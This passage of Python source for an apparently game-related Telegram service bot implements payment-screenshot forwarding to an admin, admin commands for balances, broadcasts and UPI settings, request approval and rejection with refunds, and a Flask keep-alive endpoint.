⏰ Time: {time.ctime()}

✅ Please verify and add balance:
/addbalance {user_id} {price}""")
        
        bot.reply_to(message, f"""✅ **Screenshot Received!**

📌 Service: {service_name}
💰 Amount: ₹{price}

📌 Admin will verify your payment.
⏰ This may take 2-4 hours.

✅ You will be notified once approved.
🔙 Then start the service again.""", reply_markup=main_menu())
        return
    
    # If user has pending request in user_data
    if user_id in user_data:
        service_name = user_data[user_id].get('service_name', 'Unknown Service')
        price = user_data[user_id].get('amount', 0)
        
        bot.send_photo(ADMIN_ID, file_id,
            caption=f"""📸 **PAYMENT SCREENSHOT RECEIVED!**

👤 User ID: {user_id}
👤 Username: @{message.from_user.username or 'N/A'}
📌 Service: {service_name}
💰 Amount: ₹{price}
⏰ Time: {time.ctime()}

✅ Please verify and add balance:
/addbalance {user_id} {price}""")
        
        bot.reply_to(message, f"""✅ **Screenshot Received!**

📌 Service: {service_name}
💰 Amount: ₹{price}

📌 Admin will verify your payment.
⏰ This may take 2-4 hours.

✅ You will be notified once approved.
🔙 Then start the service again.""", reply_markup=main_menu())
        return

# ============================================
# 🔹 ADMIN COMMANDS
# ============================================
@bot.message_handler(commands=['admin'])
def admin_command(message):
    if str(message.from_user.id) != str(ADMIN_ID):
        bot.reply_to(message, "❌ Not authorized!")
        return
    bot.reply_to(message, "👑 **Admin Panel**", reply_markup=admin_panel())

@bot.message_handler(commands=['addbalance'])
def admin_add_balance(message):
    if str(message.from_user.id) != str(ADMIN_ID):
        return
    try:
        parts = message.text.split()
        user_id = parts[1]
        amount = int(parts[2])
        user_balances[user_id] = user_balances.get(user_id, 0) + amount
        save_data(BALANCE_FILE, user_balances)
        bot.reply_to(message, f"✅ Added ₹{amount} to {user_id}")
        try:
            bot.send_message(user_id, f"💰 ₹{amount} added! New Balance: ₹{user_balances[user_id]}")
        except:
            pass
    except:
        bot.reply_to(message, "❌ Usage: /addbalance <user_id> <amount>")

@bot.message_handler(commands=['broadcast'])
def admin_broadcast(message):
    if str(message.from_user.id) != str(ADMIN_ID):
        return
    msg_text = message.text.replace("/broadcast ", "").strip()
    if not msg_text:
        bot.reply_to(message, "❌ Usage: /broadcast Your message here")
        return
    sent = 0
    for user_id in memory_data.keys():
        try:
            bot.send_message(user_id, f"📢 **Announcement from Admin:**\n\n{msg_text}")
            sent += 1
            time.sleep(0.05)
        except:
            pass
    for user_id in user_data.keys():
        if user_id not in memory_data:
            try:
                bot.send_message(user_id, f"📢 **Announcement from Admin:**\n\n{msg_text}")
                sent += 1
                time.sleep(0.05)
            except:
                pass
    bot.reply_to(message, f"✅ Broadcast sent to {sent} users!")

@bot.message_handler(commands=['setupi'])
def admin_set_upi(message):
    if str(message.from_user.id) != str(ADMIN_ID):
        return
    upi = message.text.replace("/setupi ", "").strip()
    if not upi:
        bot.reply_to(message, "❌ Usage: /setupi your@upi")
        return
    payment_settings['upi'] = upi
    bot.reply_to(message, f"✅ UPI updated to: {upi}")

@bot.message_handler(commands=['setphone'])
def admin_set_phone(message):
    if str(message.from_user.id) != str(ADMIN_ID):
        return
    phone = message.text.replace("/setphone ", "").strip()
    if not phone:
        bot.reply_to(message, "❌ Usage: /setphone 9876543210")
        return
    payment_settings['phone'] = phone
    bot.reply_to(message, f"✅ Phone updated to: {phone}")

@bot.message_handler(commands=['sendto'])
def admin_send_to_user(message):
    if str(message.from_user.id) != str(ADMIN_ID):
        return
    try:
        parts = message.text.split(" ", 2)
        user_id = parts[1]
        msg_text = parts[2]
        bot.send_message(user_id, f"📩 **Message from Admin:**\n\n{msg_text}")
        bot.reply_to(message, f"✅ Message sent to {user_id}")
    except:
        bot.reply_to(message, "❌ Usage: /sendto <user_id> <message>")

# ============================================
# 🔹 CALLBACK HANDLER
# ============================================
@bot.callback_query_handler(func=lambda call: True)
def handle_callback(call):
    try:
        user_id = str(call.from_user.id)
        data = call.data
        
        # Skip if already handled
        if data.startswith("copy_token_") or data.startswith("use_token_") or data.startswith("use_transfer_token_") or data.startswith("use_saved_token_") or data == "generate_new_token" or data == "generate_transfer_token" or data == "token_generated":
            return
        
        if data == "back_main":
            if user_id in user_flow:
                del user_flow[user_id]
            try:
                bot.delete_message(call.message.chat.id, call.message.message_id)
            except:
                pass
            bot.send_message(user_id, "🔙 **Main Menu:**", reply_markup=main_menu())
            safe_answer(call.id)
            return
        
        if str(call.from_user.id) != str(ADMIN_ID):
            safe_answer(call.id, "❌ Not authorized!")
            return
        
        if data == "pending":
            pending = [uid for uid, info in user_data.items() if info.get('status') == 'pending']
            if pending:
                msg = "📋 **Pending Requests:**\n\n"
                for uid in pending:
                    info = user_data[uid]
                    msg += f"🆔 {uid} | {info.get('service_name')} | ₹{info.get('amount')}\n"
                    msg += f"👤 {info.get('name')} | UID: {info.get('uid')}\n\n"
                bot.send_message(call.message.chat.id, msg)
            else:
                bot.send_message(call.message.chat.id, "✅ No pending!")
            safe_answer(call.id)
            return
        
        if data == "approve":
            pending = [uid for uid, info in user_data.items() if info.get('status') == 'pending']
            if not pending:
                bot.send_message(call.message.chat.id, "✅ No pending!")
                safe_answer(call.id)
                return
            markup = types.InlineKeyboardMarkup(row_width=1)
            for uid in pending[:10]:
                info = user_data[uid]
                markup.add(types.InlineKeyboardButton(f"{info.get('name')} - {info.get('uid')}", callback_data=f"app_{uid}"))
            bot.send_message(call.message.chat.id, "✅ Select to approve:", reply_markup=markup)
            safe_answer(call.id)
            return
        
        if data.startswith("app_"):
            uid = data.split("_")[1]
            if uid in user_data:
                user_data[uid]['status'] = 'approved'
                save_data(USER_DATA_FILE, user_data)
                try:
                    bot.send_message(uid, f"✅ **Approved!** 🎉\n\nYour {user_data[uid].get('service_name')} is complete!", reply_markup=main_menu())
                except:
                    pass
                bot.edit_message_text(f"✅ Approved {uid}", call.message.chat.id, call.message.message_id)
            safe_answer(call.id, "✅ Approved!")
            return
        
        if data == "reject":
            pending = [uid for uid, info in user_data.items() if info.get('status') == 'pending']
            if not pending:
                bot.send_message(call.message.chat.id, "✅ No pending!")
                safe_answer(call.id)
                return
            markup = types.InlineKeyboardMarkup(row_width=1)
            for uid in pending[:10]:
                info = user_data[uid]
                markup.add(types.InlineKeyboardButton(f"{info.get('name')} - {info.get('uid')}", callback_data=f"rej_{uid}"))
            bot.send_message(call.message.chat.id, "❌ Select to reject:", reply_markup=markup)
            safe_answer(call.id)
            return
        
        if data.startswith("rej_"):
            uid = data.split("_")[1]
            if uid in user_data:
                user_data[uid]['status'] = 'rejected'
                save_data(USER_DATA_FILE, user_data)
                refund = user_data[uid].get('amount', 0)
                user_balances[uid] = user_balances.get(uid, 0) + refund
                save_data(BALANCE_FILE, user_balances)
                try:
                    bot.send_message(uid, f"❌ **Rejected!**\n\n💰 ₹{refund} refunded!", reply_markup=main_menu())
                except:
                    pass
                bot.edit_message_text(f"❌ Rejected {uid} - ₹{refund} refunded", call.message.chat.id, call.message.message_id)
            safe_answer(call.id, "❌ Rejected!")
            return
        
        if data == "upload_qr":
            bot.send_message(call.message.chat.id, "📤 **Upload QR Code**\n\nSend the QR image now.")
            bot.register_next_step_handler(call.message, process_qr_upload)
            safe_answer(call.id)
            return
        
        if data == "set_upi":
            bot.send_message(call.message.chat.id, "💳 **Set UPI ID**\n\nSend: `/setupi your@upi`")
            safe_answer(call.id)
            return
        
        if data == "add_bal":
            bot.send_message(call.message.chat.id, "💳 /addbalance <user_id> <amount>")
            safe_answer(call.id)
            return
        
        if data == "broadcast":
            bot.send_message(call.message.chat.id, "📢 /broadcast Your message\n\nOr /sendto <user_id> <message>")
            safe_answer(call.id)
            return
        
        if data == "all_users":
            if not memory_data:
                bot.send_message(call.message.chat.id, "📋 No users in memory!")
                safe_answer(call.id)
                return
            msg = "📋 **All Users in Memory:**\n\n"
            count = 0
            for uid, info in memory_data.items():
                msg += f"🆔 {uid} | {info.get('name')} | @{info.get('username')}\n"
                msg += f"📅 Last Seen: {info.get('last_seen', 'N/A')}\n\n"
                count += 1
                if len(msg) > 3500:
                    bot.send_message(call.message.chat.id, msg)
                    msg = ""
            if msg:
                bot.send_message(call.message.chat.id, msg)
            bot.send_message(call.message.chat.id, f"👥 Total Users: {count}")
            safe_answer(call.id)
            return
        
        if data == "save_memory":
            save_data(MEMORY_FILE, memory_data)
            bot.send_message(call.message.chat.id, f"✅ Memory saved! Total users: {len(memory_data)}")
            safe_answer(call.id)
            return
        
        if data == "stats":
            total = len(user_data)
            pending = sum(1 for u in user_data.values() if u.get('status') == 'pending')
            approved = sum(1 for u in user_data.values() if u.get('status') == 'approved')
            rejected = sum(1 for u in user_data.values() if u.get('status') == 'rejected')
            total_balance = sum(user_balances.values())
            bot.send_message(call.message.chat.id, f"""📊 **Bot Statistics:**

👥 Total Users: {total}
⏳ Pending: {pending}
✅ Approved: {approved}
❌ Rejected: {rejected}
💰 Total Balance: ₹{total_balance}
💾 Users in Memory: {len(memory_data)}

💳 UPI: {payment_settings['upi']}
📱 Phone: {payment_settings['phone']}""")
            safe_answer(call.id)
            return
        
    except Exception as e:
        print(f"❌ Error: {e}")
        try:
            safe_answer(call.id, "❌ Error!")
        except:
            pass

def safe_answer(callback_id, text=None, show_alert=False):
    try:
        if text:
            bot.answer_callback_query(callback_id, text=text, show_alert=show_alert)
        else:
            bot.answer_callback_query(callback_id)
    except Exception as e:
        print(f"⚠️ Callback answer skipped: {e}")

def process_qr_upload(message):
    if str(message.from_user.id) != str(ADMIN_ID):
        return
    if message.photo:
        file_id = message.photo[-1].file_id
        file_info = bot.get_file(file_id)
        file_url = f"https://api.telegram.org/file/bot{BOT_TOKEN}/{file_info.file_path}"
        payment_settings['qr_url'] = file_url
        bot.reply_to(message, f"""✅ **QR Code Uploaded Successfully!**""", reply_markup=admin_panel())
    else:
        bot.reply_to(message, "❌ Please send a photo/image!", reply_markup=admin_panel())

# ============================================
# 🔹 FLASK + POLLING (RENDER FIX)
# ============================================
def run_bot():
    print("🤖 Bot polling started...")
    try:
        bot.infinity_polling()
    except Exception as e:
        print(f"❌ Polling error: {e}")

@app.route('/')
def home():
    return "🤖 FF Service Bot is Running!"

@app.route('/health')
def health():
    return "OK", 200

# ============================================
# 🔹 MAIN
# ============================================
if __name__ == "__main__":
    import threading
    print("="*50)
    print("🤖 FF Service Bot is Running!")
    print("="*50)
    print(f"👑 Admin ID: {ADMIN_ID}")
    print(f"💳 UPI: {payment_settings['upi']}")
    print(f"📱 Phone: {payment_settings['phone']}")
    print("="*50)
    print("✅ Bot is ready to use!")
    print("="*50)
    
    bot_thread = threading.Thread(target=run_bot, daemon=True)
    bot_thread.start()
    
    port = int(os.environ.get("PORT", 10000))
    app.run(host="0.0.0.0", port=port)
